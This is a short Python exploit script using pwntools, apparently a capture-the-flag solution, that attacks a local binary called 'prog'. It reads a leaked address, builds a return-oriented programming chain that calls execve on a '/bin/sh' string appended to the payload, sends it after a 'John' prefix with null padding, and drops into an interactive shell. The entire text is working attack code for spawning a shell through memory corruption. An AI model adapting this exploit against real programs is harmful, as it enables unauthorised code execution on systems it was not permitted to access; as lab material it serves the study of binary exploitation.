from pwn import *

e = ELF('prog')
context.clear(arch=e.arch, endian=e.endian)

p = e.process()

p.readuntil('at')
addr = int(p.readline(), 0)
off = 0

for i in range(2):
	r = ROP(e)
	r.execve(addr+off, 0, 0)
	off = len(str(r)) + 9

payload = 'John' + '\0'*5
payload += str(r)
payload += '/bin/sh\0'

p.sendline(payload)
p.interactive()
